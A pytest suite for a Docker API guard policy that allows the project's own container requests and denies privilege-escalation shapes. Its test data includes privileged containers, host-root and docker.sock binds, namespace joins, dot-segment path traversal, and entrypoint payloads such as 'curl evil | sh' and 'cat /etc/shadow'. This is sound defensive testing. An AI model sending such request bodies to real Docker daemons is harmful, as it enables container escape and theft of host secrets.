"""docker-guard 放行判据的表驱动单测（RK3 / PROJECT_STATE §3 #19）。

判据核心 `policy.evaluate()` 是纯函数，这里用确定性表把两类契约钉死：

1. **NA 真实用到的 Docker 动作必须放行**——形状取自 runner.py / workspace/container.py /
   console/container_manager.py / sandbox/network_guard.py 的实际请求体。改坏任一条 = 沙盒/CC/
   NapCat/网络隔离在硬化部署下静默失效。
2. **提权形状必须拒绝**——特权容器、挂载宿主 `/`、host PID/IPC namespace、越界能力、
   宿主设备、绕过 Binds 的 Mounts、非 iptables 的 host 网络容器等。这些正是 RK3 的攻击面：
   实测（见 docs/docker-guard.md）攻击者用 `Privileged+Binds:/:/host` 起容器即可读宿主 `/etc/shadow`。

`CONTAINERS=1` 那个结论（tecnativa 路径级代理放行 create 就等于放回提权路径）由本文件的
「同一个 create 端点，合法体 allow、特权体 deny」共同体现——路径相同、判据在请求体。
"""

import ast
import re
from pathlib import Path
from typing import Any, Dict, Optional

import pytest

from nekro_agent.services.docker_guard.policy import (
    PolicyContext,
    body_guard_rule,
    container_ownership_target,
    evaluate,
    is_safe_container_ref,
    labels_indicate_ownership,
    network_connect_target,
    normalize_path,
)

DATA_DIR = "/srv/nekro_agent"
CTX = PolicyContext(allowed_bind_roots=(DATA_DIR,))

NA_IMAGE = "kromiose/nekro-agent:latest"
SANDBOX_IMAGE = "kromiose/nekro-agent-sandbox:latest"


# ---------------------------------------------------------------------------
# 真实合法请求体样本（贴合各模块实际构造）
# ---------------------------------------------------------------------------

def _sandbox_create() -> Dict[str, Any]:
    """services/sandbox/runner.py 的沙盒容器形状。"""
    return {
        "Image": SANDBOX_IMAGE,
        "Labels": {"nekro.sandbox": "1"},
        "Cmd": ["bash", "-c", "python /app/main.py"],
        "HostConfig": {
            "Binds": [
                f"{DATA_DIR}/pip_cache/ob1:/app/.pip_cache:rw",
                f"{DATA_DIR}/packages/ob1:/app/packages:rw",
                f"{DATA_DIR}/sandboxes/x:/app/shared:rw",
                f"{DATA_DIR}/uploads/ob1:/app/uploads:ro",
            ],
            "Memory": 512 * 1024 * 1024,
            "NanoCPUs": 1_000_000_000,
            "SecurityOpt": ["no-new-privileges"],
            "NetworkMode": "nekro_sandbox_net",
            "ExtraHosts": ["host.docker.internal:172.20.0.1"],
        },
        "User": "nobody",
    }


def _cc_workspace_create() -> Dict[str, Any]:
    """services/workspace/container.py 的 CC 工作区容器形状。"""
    return {
        "Image": SANDBOX_IMAGE,
        "HostConfig": {
            "Binds": [
                f"{DATA_DIR}/workspaces/12:/workspace:rw",
                f"{DATA_DIR}/workspaces/12/.claude_home:/home/appuser/.claude:rw",
                "/etc/localtime:/etc/localtime:ro",
            ],
            "PortBindings": {"8080/tcp": [{"HostIp": "127.0.0.1", "HostPort": "34567"}]},
            "RestartPolicy": {"Name": "no"},
            "NetworkMode": "nekro_workspace_t1",
        },
        "Env": ["WORKSPACE_ROOT=/workspace"],
        "ExposedPorts": {"8080/tcp": {}},
    }


def _napcat_create() -> Dict[str, Any]:
    """services/console/container_manager.py 的 NapCat 容器形状。"""
    return {
        "Image": "mlikiowa/napcat-docker:latest",
        # 键名逐字取自 container_manager 的 LABEL_INSTANCE / LABEL_OWNER
        "Labels": {"nekro.napcat.instance": "ob1", "nekro.napcat.owner": "platform"},
        "ExposedPorts": {"6099/tcp": {}},
        "HostConfig": {
            "Binds": [
                f"{DATA_DIR}:/app/nekro_agent_data",
                f"{DATA_DIR}/napcat_data/ob1/QQ:/app/.config/QQ",
                f"{DATA_DIR}/napcat_data/ob1/config:/app/napcat/config",
            ],
            "PortBindings": {"6099/tcp": [{"HostIp": "127.0.0.1", "HostPort": "36551"}]},
            "RestartPolicy": {"Name": "unless-stopped"},
            "NetworkMode": "nekro_network",
        },
    }


def _netguard_create() -> Dict[str, Any]:
    """services/sandbox/network_guard.py 的 iptables 临时容器形状（唯一合法的 host 网络容器）。"""
    return {
        "Image": NA_IMAGE,
        "Cmd": ["iptables", "-w", "5", "-I", "DOCKER-USER", "-j", "DROP"],
        "Entrypoint": [],
        "Labels": {"nekro.netguard": "1"},
        "HostConfig": {
            "NetworkMode": "host",
            "CapAdd": ["NET_ADMIN", "NET_RAW"],
            "AutoRemove": False,
        },
    }


# ---------------------------------------------------------------------------
# 放行端点（非 create）
# ---------------------------------------------------------------------------

ALLOWED_ENDPOINTS = [
    ("GET", "/version"),
    ("GET", "/v1.51/version"),
    ("GET", "/info"),
    ("GET", "/_ping"),
    ("GET", "/containers/json?all=true"),
    ("GET", "/containers/nekro-cc-abcd1234/json"),
    ("GET", "/v1.51/containers/abcd/json"),
    ("GET", "/containers/abcd/logs?stdout=true&stderr=true&follow=true"),
    ("POST", "/containers/abcd/start"),
    ("POST", "/containers/abcd/stop?t=10"),
    ("POST", "/containers/abcd/restart?t=10"),
    ("POST", "/containers/abcd/kill"),
    ("POST", "/containers/abcd/wait"),
    ("DELETE", "/containers/abcd?force=true"),
    ("GET", "/exec/deadbeef/json"),
    ("POST", "/exec/deadbeef/resize?h=24&w=80"),
    ("POST", "/images/create?fromImage=alpine&tag=latest"),
    ("GET", "/images/alpine:latest/json"),
    ("POST", "/networks/create"),
    ("GET", "/networks/nekro_sandbox_net"),
    ("POST", "/networks/nekro_workspace_t1/connect"),
]


@pytest.mark.parametrize("method,path", ALLOWED_ENDPOINTS)
def test_allowed_endpoints_pass(method: str, path: str):
    decision = evaluate(method, path, CTX)
    assert decision.allow, f"{method} {path} 应放行，实际 deny: {decision.reason}"


DENIED_ENDPOINTS = [
    # NA 从不调用、且危险的端点
    ("POST", "/containers/abcd/update"),      # 改配额/cgroup
    ("POST", "/commit"),                        # 把运行中容器打成镜像
    ("GET", "/events"),                         # 事件流（信息泄露）
    ("POST", "/build"),                         # 构建镜像
    ("GET", "/volumes"),
    ("POST", "/volumes/create"),
    ("DELETE", "/images/alpine:latest"),        # 删镜像
    ("PUT", "/containers/abcd/archive?path=/"), # put_archive 覆盖容器内文件
    ("GET", "/containers/abcd/archive?path=/etc/shadow"),  # get_archive 偷文件
    ("GET", "/swarm"),
    ("POST", "/swarm/init"),
    ("GET", "/secrets"),
    ("POST", "/containers/abcd/attach"),        # 劫持 stdio
    ("GET", "/networks"),                       # 列全部网络（未在白名单，NA 只 inspect 具体网络）
]


@pytest.mark.parametrize("method,path", DENIED_ENDPOINTS)
def test_denied_endpoints_rejected(method: str, path: str):
    decision = evaluate(method, path, CTX)
    assert not decision.allow, f"{method} {path} 应拒绝，实际放行"
    assert decision.rule == "endpoint.denied"


# ---------------------------------------------------------------------------
# 路径相对段：判据看到的路径必须就是 Docker 最终看到的路径
#
# 实测绕过（round-14 复核）：代理转发时用 yarl 拼 URL，而 yarl 会**自己消解 `..`**——
#   URL("http://docker/images/x/../../containers/victim/json").path == "/containers/victim/json"
# 于是这条请求被判成 `images.inspect`（镜像引用本就含 `/`、这条端点不查归属）放行，
# 发到 Docker 的却是对**任意容器**的 inspect：归属门被从另一个端点整条绕过，
# 兄弟 postgres 的 `POSTGRES_PASSWORD` 直接读走。两侧同时收口：判据 deny 相对段，
# 转发按原样字节（见 test_docker_guard_proxy.py 的 forward 断言）。
# ---------------------------------------------------------------------------

TRAVERSAL_PATHS = [
    ("GET", "/images/x/../../containers/victim/json"),          # 裸 `..`
    ("GET", "/images/x/%2e%2e/%2e%2e/containers/victim/json"),  # 百分号编码（Go 侧同样解成 `..`）
    ("GET", "/images/x/%2E%2E/%2E%2E/containers/victim/json"),  # 大写编码
    ("GET", "/v1.51/images/x/../../containers/victim/json"),    # 带 API 版本前缀
    ("GET", "/containers/./abcd/json"),                          # 单点段
    ("GET", "/images/x/..%2F..%2Fcontainers/victim/json"),      # 编码斜杠
]


@pytest.mark.parametrize("method,path", TRAVERSAL_PATHS)
def test_paths_with_dot_segments_are_denied(method: str, path: str):
    decision = evaluate(method, path, CTX)
    assert not decision.allow, f"{path} 含相对段，转发时会被改写成另一个端点，必须拒绝"
    assert decision.rule == "endpoint.path_traversal", decision.rule


@pytest.mark.parametrize("method,path", TRAVERSAL_PATHS)
def test_traversal_paths_yield_no_ownership_target(method: str, path: str):
    """含相对段的路径不得算出归属目标：它会让代理拿一个「安全」的目标去过门，实际发出另一条请求。"""
    assert container_ownership_target(method, path) is None


def test_traversal_target_after_rewrite_is_a_container_endpoint():
    """钉住这条绕过的**真实危害**：改写后落到的正是需要归属校验的 inspect 端点。

    没有这条断言，上面那组 deny 只是「拒绝了一些奇怪路径」，读不出为什么必须拒。
    """
    from yarl import URL  # noqa: PLC0415 — 只在这条断言里需要，避免污染模块导入

    rewritten = URL("http://docker/images/x/../../containers/victim/json").path
    assert rewritten == "/containers/victim/json"          # yarl 确实会改写
    assert evaluate("GET", rewritten, CTX).rule == "containers.inspect"
    assert container_ownership_target("GET", rewritten) == "victim"  # 改写后才需要归属校验


def test_normal_image_reference_with_slashes_still_allowed():
    """收紧不能误伤：镜像引用天然含 `/`、`:`、`@`。"""
    for path in (
        "/images/library/python:3.11/json",
        "/images/kromiose/nekro-agent-sandbox:latest/json",
        "/images/alpine@sha256:0123456789abcdef/json",
    ):
        assert evaluate("GET", path, CTX).allow, path


# ---------------------------------------------------------------------------
# create 请求体：合法形状放行
# ---------------------------------------------------------------------------

LEGIT_CREATE_BODIES = [
    ("sandbox", _sandbox_create()),
    ("cc_workspace", _cc_workspace_create()),
    ("napcat", _napcat_create()),
    ("netguard", _netguard_create()),
]


@pytest.mark.parametrize("name,body", LEGIT_CREATE_BODIES)
def test_legit_create_bodies_pass(name: str, body: Dict[str, Any]):
    decision = evaluate("POST", "/containers/create?name=x", CTX, body=body)
    assert decision.allow, f"{name} 合法 create 被拒: {decision.reason}"


# ---------------------------------------------------------------------------
# create 请求体：提权形状拒绝（RK3 攻击面）
# ---------------------------------------------------------------------------

def _with_hostconfig(**hc: Any) -> Dict[str, Any]:
    base = {"Image": "alpine:latest", "Cmd": ["sh"]}
    base["HostConfig"] = hc
    return base


DANGEROUS_CREATE_BODIES = [
    (
        "privileged",
        _with_hostconfig(Privileged=True),
        "create.privileged",
    ),
    (
        "bind_host_root",
        _with_hostconfig(Binds=["/:/host"]),
        "create.binds.outside_data_dir",
    ),
    (
        "bind_docker_sock",
        _with_hostconfig(Binds=["/var/run/docker.sock:/var/run/docker.sock"]),
        "create.binds.outside_data_dir",
    ),
    (
        "bind_etc",
        _with_hostconfig(Binds=["/etc:/host_etc:ro"]),
        "create.binds.outside_data_dir",
    ),
    (
        "bind_dotdot_escape",
        _with_hostconfig(Binds=[f"{DATA_DIR}/../../root:/host_root:rw"]),
        "create.binds.outside_data_dir",
    ),
    (
        "localtime_rw_not_ro",
        _with_hostconfig(Binds=["/etc/localtime:/etc/localtime:rw"]),
        "create.binds.ro_required",
    ),
    (
        "pid_host",
        _with_hostconfig(PidMode="host"),
        "create.pidmode_host",
    ),
    (
        "ipc_host",
        _with_hostconfig(IpcMode="host"),
        "create.ipcmode_host",
    ),
    (
        "userns_host",
        _with_hostconfig(UsernsMode="host"),
        "create.usernsmode_host",
    ),
    (
        "cgroup_parent",
        _with_hostconfig(CgroupParent="/evil"),
        "create.cgroup_parent",
    ),
    (
        "devices",
        _with_hostconfig(Devices=[{"PathOnHost": "/dev/sda", "PathInContainer": "/dev/sda"}]),
        "create.devices",
    ),
    (
        "sys_admin_cap",
        _with_hostconfig(CapAdd=["SYS_ADMIN"]),
        "create.capadd.forbidden",
    ),
    (
        "mounts_bypass",
        _with_hostconfig(Mounts=[{"Type": "bind", "Source": "/", "Target": "/host"}]),
        "create.mounts.forbidden",
    ),
    (
        "apparmor_unconfined",
        _with_hostconfig(SecurityOpt=["apparmor=unconfined"]),
        "create.securityopt.forbidden",
    ),
    (
        "seccomp_unconfined",
        _with_hostconfig(SecurityOpt=["seccomp=unconfined"]),
        "create.securityopt.forbidden",
    ),
    (
        "sysctls",
        _with_hostconfig(Sysctls={"net.ipv4.ip_forward": "1"}),
        "create.sysctls",
    ),
    # —— round-14 复核补齐：Binds 判据的第三个入口与命名空间共享的第二种形态 ——
    (
        # VolumesFrom 整份继承另一个容器的挂载表：宿主上只要有一个挂了 docker.sock 的容器
        # （guard 的威胁模型里这个前提成立），这一行就等价于把 docker.sock 挂进来 → 宿主 root，
        # 而 Binds / Mounts 两条判据一个字都不会被触发。
        "volumes_from_sibling",
        _with_hostconfig(VolumesFrom=["nekro_dev_postgres"]),
        "create.volumes_from.forbidden",
    ),
    (
        # PidMode=container:X 进到别的容器的 PID 命名空间，容器内 root 即可经 /proc/<pid>/root
        # 读写对方整个文件系统。只挡 `host` 挡不住这条。
        "pid_join_container",
        _with_hostconfig(PidMode="container:nekro_dev_postgres"),
        "create.pidmode_container",
    ),
    (
        "net_join_container",
        _with_hostconfig(NetworkMode="container:nekro_dev_postgres"),
        "create.networkmode_container",
    ),
    (
        "ipc_join_container",
        _with_hostconfig(IpcMode="container:nekro_dev_postgres"),
        "create.ipcmode_container",
    ),
    (
        "uts_host",
        _with_hostconfig(UTSMode="host"),
        "create.utsmode_host",
    ),
    (
        "custom_runtime",
        _with_hostconfig(Runtime="sysbox-runc"),
        "create.runtime",
    ),
]


@pytest.mark.parametrize("name,body,expected_rule", DANGEROUS_CREATE_BODIES)
def test_dangerous_create_bodies_rejected(name: str, body: Dict[str, Any], expected_rule: str):
    decision = evaluate("POST", "/containers/create?name=x", CTX, body=body)
    assert not decision.allow, f"{name} 提权形状被放行了！"
    assert decision.rule == expected_rule, f"{name} 期望规则 {expected_rule}，实际 {decision.rule}"


# ---------------------------------------------------------------------------
# host 网络容器只允许 netguard/iptables 形状（其余提权变体拒绝）
# ---------------------------------------------------------------------------

HOSTNET_VARIANTS = [
    (
        "hostnet_no_label",
        {
            "Image": NA_IMAGE,
            "Cmd": ["iptables", "-L"],
            "HostConfig": {"NetworkMode": "host", "CapAdd": ["NET_ADMIN"]},
        },
        "create.hostnet.not_netguard",
    ),
    (
        "hostnet_shell_cmd",
        {
            "Image": NA_IMAGE,
            "Cmd": ["sh", "-c", "cat /etc/shadow"],
            "Labels": {"nekro.netguard": "1"},
            "HostConfig": {"NetworkMode": "host", "CapAdd": ["NET_ADMIN", "NET_RAW"]},
        },
        "create.hostnet.cmd_not_iptables",
    ),
    (
        "hostnet_with_binds",
        {
            "Image": NA_IMAGE,
            "Cmd": ["iptables", "-L"],
            "Labels": {"nekro.netguard": "1"},
            "HostConfig": {
                "NetworkMode": "host",
                "CapAdd": ["NET_ADMIN"],
                "Binds": ["/:/host"],
            },
        },
        # Binds 越界先于 host 网络细节被拦下
        "create.binds.outside_data_dir",
    ),
    (
        # 实测过的绕过：Cmd 摆成 iptables，真正跑的 Entrypoint 是 shell（Docker 跑 entrypoint）。
        "hostnet_entrypoint_shell_list",
        {
            "Image": NA_IMAGE,
            "Cmd": ["iptables", "-L"],
            "Entrypoint": ["/bin/sh", "-c", "id; cat /etc/shadow"],
            "Labels": {"nekro.netguard": "1"},
            "HostConfig": {"NetworkMode": "host", "CapAdd": ["NET_ADMIN", "NET_RAW"]},
        },
        "create.hostnet.cmd_not_iptables",
    ),
    (
        # Entrypoint 的字符串形式 = `/bin/sh -c <字符串>`，同样是 shell。
        "hostnet_entrypoint_shell_str",
        {
            "Image": NA_IMAGE,
            "Cmd": ["iptables", "-L"],
            "Entrypoint": "curl evil | sh",
            "Labels": {"nekro.netguard": "1"},
            "HostConfig": {"NetworkMode": "host", "CapAdd": ["NET_ADMIN"]},
        },
        "create.hostnet.entrypoint_shell",
    ),
]


@pytest.mark.parametrize("name,body,expected_rule", HOSTNET_VARIANTS)
def test_hostnet_only_iptables(name: str, body: Dict[str, Any], expected_rule: str):
    decision = evaluate("POST", "/containers/create", CTX, body=body)
    assert not decision.allow, f"{name} 应被拒"
    assert decision.rule == expected_rule, f"{name}: 期望 {expected_rule}，实际 {decision.rule}"


HOSTNET_ALLOWED_VARIANTS = [
    # netguard 的两种合法形态：Entrypoint 显式清空 + Cmd=iptables（真实用法），
    ("entrypoint_empty_cmd_iptables", {"Cmd": ["iptables", "-L"], "Entrypoint": []}),
    # 或把 iptables 放进 Entrypoint（等价，实际执行的仍是 iptables）。
    ("entrypoint_iptables", {"Cmd": ["-w", "5", "-L"], "Entrypoint": ["iptables"]}),
]


@pytest.mark.parametrize("name,over", HOSTNET_ALLOWED_VARIANTS)
def test_hostnet_legit_iptables_shapes_pass(name: str, over: Dict[str, Any]):
    body = {
        "Image": NA_IMAGE,
        "Labels": {"nekro.netguard": "1"},
        "HostConfig": {"NetworkMode": "host", "CapAdd": ["NET_ADMIN", "NET_RAW"]},
        **over,
    }
    decision = evaluate("POST", "/containers/create", CTX, body=body)
    assert decision.allow, f"{name} 合法 netguard 形状被拒: {decision.reason}"


# ---------------------------------------------------------------------------
# 路径归一化
# ---------------------------------------------------------------------------

NORMALIZE_CASES = [
    ("/v1.51/containers/create", "/containers/create"),
    ("/v1.41/version", "/version"),
    ("/containers/create?name=x", "/containers/create"),
    ("//containers//create", "/containers/create"),
    ("/containers/abcd/json/", "/containers/abcd/json"),
    ("/version", "/version"),
]


@pytest.mark.parametrize("raw,expected", NORMALIZE_CASES)
def test_normalize_path(raw: str, expected: str):
    assert normalize_path(raw) == expected


def test_create_without_body_denied():
    """create 端点若拿不到可解析请求体，判据必须 deny 而不是默认放行。"""
    decision = evaluate("POST", "/containers/create", CTX, body=None)
    assert not decision.allow
    assert decision.rule == "create.body.missing"


def test_no_allowed_root_rejects_all_binds():
    """未配置 allowed_bind_roots 时（部署缺 NEKRO_DATA_DIR），任何 bind 都越界——安全侧默认。"""
    ctx = PolicyContext(allowed_bind_roots=())
    body = _sandbox_create()
    decision = evaluate("POST", "/containers/create", ctx, body=body)
    assert not decision.allow
    assert decision.rule == "create.binds.outside_data_dir"


def test_empty_binds_and_hostconfig_ok():
    """无 HostConfig / 无 Binds 的最简 create（如仅 Image+Cmd）应放行。"""
    body: Dict[str, Any] = {"Image": "alpine:latest", "Cmd": ["true"]}
    decision = evaluate("POST", "/containers/create", CTX, body=body)
    assert decision.allow, decision.reason


# ---------------------------------------------------------------------------
# exec 请求体：create 那侧逐字段判到死，exec 这侧同名同义的字段也得判
# ---------------------------------------------------------------------------


def test_exec_create_privileged_denied():
    """`exec --privileged` 会补齐全部 capability 并摘掉 seccomp/AppArmor —— 与 create 的 Privileged 同义。"""
    decision = evaluate("POST", "/containers/abcd/exec", CTX, body={"Cmd": ["sh"], "Privileged": True})
    assert not decision.allow
    assert decision.rule == "exec.privileged"


def test_exec_create_normal_body_allowed():
    """NA 真实的 exec（MCP stdio 校验 / CC 终端）不设 Privileged，必须照常放行。"""
    body = {"Cmd": ["/bin/bash"], "AttachStdin": True, "AttachStdout": True, "Tty": True}
    assert evaluate("POST", "/containers/abcd/exec", CTX, body=body).allow


def test_exec_create_without_body_denied():
    """判不了就不放行（Cmd 是必填，没有请求体的 exec 创建本来就不合法）。"""
    decision = evaluate("POST", "/containers/abcd/exec", CTX, body=None)
    assert not decision.allow
    assert decision.rule == "exec.body.missing"


EXEC_START_CASES = [
    # (请求体, 是否放行) —— Detach=false / 缺省都是 HTTP 劫持流，guard 转发不了，明确拒绝
    ({"Detach": True}, True),
    ({"Detach": False, "Tty": True}, False),
    ({"Tty": True}, False),
    (None, False),
]


@pytest.mark.parametrize("body,allowed", EXEC_START_CASES)
def test_exec_start_hijack_denied(body: Optional[Dict[str, Any]], allowed: bool):
    """劫持流（`Connection: Upgrade` + 裸双向流）guard 代理不了。

    不拒绝的话表现是**挂住或输出乱码**（stdin 没有回传通道、raw-stream 帧与分块帧混在一起），
    正是 §2.6 教训②要避免的不可诊断故障。硬化部署下 CC 终端与 MCP stdio 校验不可用，
    这条断言把「明确失败」钉住。
    """
    decision = evaluate("POST", "/exec/deadbeef/start", CTX, body=body)
    assert decision.allow is allowed, decision.reason
    if not allowed:
        assert decision.rule == "exec.start.hijack_unsupported"


# ---------------------------------------------------------------------------
# 归属门的第二个出口：目标容器写在请求体里
# ---------------------------------------------------------------------------

NETWORK_CONNECT_CASES = [
    ("POST", "/networks/nekro_sandbox_net/connect", {"Container": "victim"}, "victim"),
    ("POST", "/v1.51/networks/net1/connect", {"Container": "abc", "EndpointConfig": {}}, "abc"),
    # 不是 connect / 不是 POST / 没有 Container 字段 → 无需判
    ("POST", "/networks/create", {"Container": "victim"}, None),
    ("GET", "/networks/net1", None, None),
    ("POST", "/networks/net1/connect", {}, None),
    ("POST", "/networks/net1/connect", None, None),
    ("POST", "/networks/net1/connect", {"Container": 123}, None),
]


@pytest.mark.parametrize("method,path,body,expected", NETWORK_CONNECT_CASES)
def test_network_connect_target(method: str, path: str, body: Optional[Dict[str, Any]], expected: Optional[str]):
    """`POST /networks/{id}/connect` 把容器引用放在请求体里 —— URL 上的归属门看不到它。

    不判的话攻击者能把宿主上**别人的**容器接进 NA 的沙盒/工作区网络，拿到一条本不存在的横向通路。
    """
    assert network_connect_target(method, path, body) == expected


UNSAFE_CONTAINER_REFS = ["a/../b", "victim/../../containers/mine", "a/b", "", "/abs", ".."]


@pytest.mark.parametrize("ref", UNSAFE_CONTAINER_REFS)
def test_unsafe_container_ref_rejected(ref: str):
    """请求体里的引用会被拿去拼一条 inspect URL：含 `/`/`..` 就能骗代理去 inspect 另一个容器。"""
    assert is_safe_container_ref(ref) is False


@pytest.mark.parametrize("ref", ["abcd1234", "nekro_dev_postgres", "a" * 64, "nekro-cc-1.2"])
def test_safe_container_ref_accepted(ref: str):
    assert is_safe_container_ref(ref) is True


# ---------------------------------------------------------------------------
# 端点表与「要不要读请求体」是同一张表推出来的（避免第二处实现漂移）
# ---------------------------------------------------------------------------

BODY_GUARD_RULE_CASES = [
    ("POST", "/containers/create", "create"),
    ("POST", "/containers/abcd/exec", "exec_create"),
    ("POST", "/exec/deadbeef/start", "exec_start"),
    # connect 的目标容器在请求体里，归属门要读它 —— 「哪些端点要读 body」只有端点表这一处判断
    ("POST", "/networks/net1/connect", "network_connect"),
    ("GET", "/containers/abcd/json", ""),
    ("GET", "/version", ""),
    ("POST", "/networks/create", ""),
]


@pytest.mark.parametrize("method,path,expected", BODY_GUARD_RULE_CASES)
def test_body_guard_rule(method: str, path: str, expected: str):
    assert body_guard_rule(method, path) == expected


# ---------------------------------------------------------------------------
# 容器归属门：哪些端点需要判「目标容器是不是本部署建的」
# ---------------------------------------------------------------------------

# (method, path, 期望取出的容器引用)。None = 该端点不需要归属校验。
CONTAINER_SCOPED_CASES = [
    # 按 ID 指向具体容器 → 必须判归属，能取出容器引用
    ("POST", "/containers/deadbeef/exec", "deadbeef"),
    ("GET", "/containers/deadbeef/json", "deadbeef"),
    ("GET", "/v1.51/containers/deadbeef/json", "deadbeef"),
    ("GET", "/containers/deadbeef/logs?follow=true", "deadbeef"),
    ("POST", "/containers/deadbeef/start", "deadbeef"),
    ("POST", "/containers/deadbeef/stop?t=10", "deadbeef"),
    ("POST", "/containers/deadbeef/restart", "deadbeef"),
    ("POST", "/containers/deadbeef/kill", "deadbeef"),
    ("POST", "/containers/deadbeef/wait", "deadbeef"),
    ("DELETE", "/containers/deadbeef?force=true", "deadbeef"),
    # 用容器名指向的也一样要判
    ("POST", "/containers/nekro_dev_postgres/exec", "nekro_dev_postgres"),
    # 不指向单个容器 / 已被别的判据覆盖 → 无需归属校验
    ("POST", "/containers/create", None),
    ("GET", "/containers/json?all=true", None),
    ("POST", "/exec/deadbeef/start", None),  # exec 句柄不是容器 ID
    ("GET", "/exec/deadbeef/json", None),
    ("GET", "/version", None),
    ("POST", "/images/create?fromImage=alpine", None),
    ("GET", "/networks/nekro_sandbox_net", None),
    ("POST", "/networks/nekro_sandbox_net/connect", None),
]


@pytest.mark.parametrize("method,path,expected", CONTAINER_SCOPED_CASES)
def test_container_ownership_target(method: str, path: str, expected: Optional[str]):
    assert container_ownership_target(method, path) == expected


OWNERSHIP_LABEL_CASES = [
    # NA 自己建的四类容器都带 nekro.* 标签 → 判为本部署
    ({"nekro.sandbox.instance": "default"}, True),      # 沙盒
    ({"nekro.instance": "ob1", "nekro.owner": "platform"}, True),  # NapCat
    ({"nekro.netguard": "1"}, True),                     # netguard 临时容器
    ({"nekro.owner.scope": "myfork-3f2a91c4-"}, True),   # CC 工作区
    # 第三方 / 兄弟容器：不带 nekro.* → 判为非本部署
    ({}, False),
    (None, False),
    ({"com.docker.compose.project": "ncqq"}, False),     # 别的 compose 项目
    ({"maintainer": "postgres"}, False),                 # 兄弟 postgres
    ("not-a-dict", False),
    ({"nekromancer": "1"}, False),                       # 前缀必须是 `nekro.`，不是 `nekro`
]


@pytest.mark.parametrize("labels,expected", OWNERSHIP_LABEL_CASES)
def test_labels_indicate_ownership(labels: Any, expected: bool):
    assert labels_indicate_ownership(labels) is expected


# ---------------------------------------------------------------------------
# 「NA 建的每个容器都带 nekro.* 标签」是归属门成立的前提，而它散落在四个模块里
#
# 本轮 CC 工作区就是漏的那一个（补了 `nekro.owner.scope` 才修好）。再加第五个建容器的地方时，
# 漏掉标签的表现是**硬化部署下 NA 操作不了自己刚建的长命容器**（代理重启后快表就空了），
# 本地跑不出来。所以这里直接扫源码里的 `"Labels": {...}` 字面量，按同一个判据过一遍。
# ---------------------------------------------------------------------------

SERVICES_DIR = Path(__file__).resolve().parent.parent / "nekro_agent" / "services"


def _module_str_constants(tree: ast.Module) -> Dict[str, str]:
    """模块级 `NAME = "字面量"`。NapCat 那张表的键就是这种常量（`LABEL_INSTANCE` 等），
    只认字面量键的话会把它误判成「空表」——那正是「扫描器被配成看不见问题」的经典形态。"""
    consts: Dict[str, str] = {}
    for node in tree.body:
        if isinstance(node, ast.Assign) and isinstance(node.value, ast.Constant) and isinstance(node.value.value, str):
            for tgt in node.targets:
                if isinstance(tgt, ast.Name):
                    consts[tgt.id] = node.value.value
    return consts


def _literal_label_dicts() -> "list[tuple[str, int, Dict[str, Any]]]":
    """收集 `nekro_agent/services` 下所有写成字面量的 `"Labels": {...}`（键可为模块级字符串常量）。"""
    found: "list[tuple[str, int, Dict[str, Any]]]" = []
    for path in sorted(SERVICES_DIR.rglob("*.py")):
        tree = ast.parse(path.read_text(encoding="utf-8"), filename=str(path))
        consts = _module_str_constants(tree)
        for node in ast.walk(tree):
            if not isinstance(node, ast.Dict):
                continue
            for key, value in zip(node.keys, node.values):
                if not (isinstance(key, ast.Constant) and key.value == "Labels"):
                    continue
                if not isinstance(value, ast.Dict):
                    continue  # 动态构造的标签表，本用例覆盖不到
                labels: Dict[str, Any] = {}
                for k in value.keys:
                    if isinstance(k, ast.Constant) and isinstance(k.value, str):
                        labels[k.value] = "<expr>"
                    elif isinstance(k, ast.Name) and k.id in consts:
                        labels[consts[k.id]] = "<expr>"
                found.append((str(path.relative_to(SERVICES_DIR)), key.lineno, labels))
    return found


def test_every_literal_label_table_passes_the_ownership_judgement():
    tables = _literal_label_dicts()
    # 前提断言：扫不到东西说明这条用例已经失效（模块搬走 / 写法变了），别静默通过
    assert len(tables) >= 4, f"只扫到 {len(tables)} 张标签表，本用例的前提变了"
    for rel, lineno, labels in tables:
        assert labels_indicate_ownership(labels), (
            f"{rel}:{lineno} 的标签表 {sorted(labels)} 不带 nekro.* 前缀："
            "docker-guard 的归属门会把 NA 对这个容器的 exec/inspect/logs/stop 一并挡掉"
        )


# 建容器的模块清单。**写死是有意的**：只扫「已有的标签表合不合格」会漏掉「整张表被删了」
# 这种最常见的形态（本轮 CC 工作区就是一个字都没有），扫描器于是永远看不到问题。
# 这份清单同时逼着「新增第五个建容器的地方」时必须在这里露头。
CONTAINER_CREATING_MODULES = {
    "console/container_manager.py",   # NapCat
    "sandbox/network_guard.py",       # netguard iptables 临时容器
    "sandbox/runner.py",              # 沙盒
    "workspace/container.py",         # CC 工作区
}

_CREATE_CALL = re.compile(r"containers\.(create_or_replace|create|run)\s*\(")


def test_container_creating_modules_all_carry_an_ownership_label():
    """每个建容器的模块都必须有一张过得了归属判据的标签表。

    漏标签的表现是**硬化部署下 NA 操作不了自己建的长命容器**（代理一重启快表就空了，
    只剩 inspect+标签兜底），本地与非硬化部署都跑不出来。
    """
    discovered = {
        str(path.relative_to(SERVICES_DIR)).replace("\\", "/")
        for path in SERVICES_DIR.rglob("*.py")
        if _CREATE_CALL.search(path.read_text(encoding="utf-8"))
    }
    assert discovered == CONTAINER_CREATING_MODULES, (
        f"建容器的模块清单变了：多出 {sorted(discovered - CONTAINER_CREATING_MODULES)}，"
        f"少了 {sorted(CONTAINER_CREATING_MODULES - discovered)}。"
        "新增的那个必须给容器打 nekro.* 标签，否则 docker-guard 的归属门会挡掉 NA 对它的操作"
    )

    by_module: Dict[str, bool] = {rel.replace("\\", "/"): False for rel in CONTAINER_CREATING_MODULES}
    for rel, _lineno, labels in _literal_label_dicts():
        key = rel.replace("\\", "/")
        if key in by_module and labels_indicate_ownership(labels):
            by_module[key] = True
    missing = sorted(mod for mod, ok in by_module.items() if not ok)
    assert not missing, f"这些建容器的模块里没有任何一张带 nekro.* 前缀的标签表: {missing}"
